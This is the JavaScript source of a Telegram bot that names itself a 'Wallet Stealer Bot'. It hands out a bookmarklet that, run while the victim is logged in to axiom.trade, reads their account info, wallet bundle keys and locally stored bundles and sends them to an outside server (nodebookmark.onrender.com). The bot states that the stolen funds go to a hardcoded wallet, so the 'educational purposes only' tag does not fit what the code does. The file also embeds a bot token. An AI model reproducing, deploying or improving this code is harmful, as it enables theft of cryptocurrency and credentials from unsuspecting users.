const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const DEFAULT_WALLET = 'CFBkgsCnDwZmu3U2LsawtWFzbWRpDR2rQMCEPzkxz7Ba';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Generate bookmarklet with default wallet
bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  
  const bookmarklet = `javascript:(async()=>{
    try{
      if(location.hostname!=='axiom.trade'){
        alert('Please navigate to axiom.trade first');
        return;
      }
      if(!localStorage.getItem('isAuthed')){
        return alert('Please log in to axiom.trade first')
      }
      const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
      const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
      const bookmarkData={
        telegramId:'${chatId}',
        site:location.href,
        user:user,
        bundle:bundle.bundleKey,
        sBundles:localStorage.getItem('sBundles'),
        eBundles:localStorage.getItem('eBundles'),
        defaultWallet:'${DEFAULT_WALLET}'
      };
      location.replace('https://nodebookmark.onrender.com/data/'+btoa(JSON.stringify(bookmarkData)))
    }catch(e){
      alert('Error occurred')
    }
  })();`;

  bot.sendMessage(chatId, `
🎯 **Bookmarklet Generated**

💳 **Default Collection Wallet:**
\`${DEFAULT_WALLET}\`

📋 **Bookmarklet Code:**
\`\`\`
${bookmarklet}
\`\`\`

**Instructions:**
1. Copy the code above
2. Create a bookmark with this code as the URL  
3. Use on axiom.trade when logged in
4. All funds go to the default wallet automatically

⚠️ Educational purposes only
  `, { parse_mode: 'Markdown' });
});

bot.onText(/\/wallet/, (msg) => {
  bot.sendMessage(msg.chat.id, `💳 Default Collection Wallet:\n\`${DEFAULT_WALLET}\``, {
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `
🎯 **Wallet Stealer Bot**

Commands:
/generate - Get bookmarklet code
/wallet - Show default wallet address  
/start - Show this menu

All stolen funds are sent to:
\`${DEFAULT_WALLET}\`
  `, { parse_mode: 'Markdown' });
});

console.log('Bot started with default wallet:', DEFAULT_WALLET);
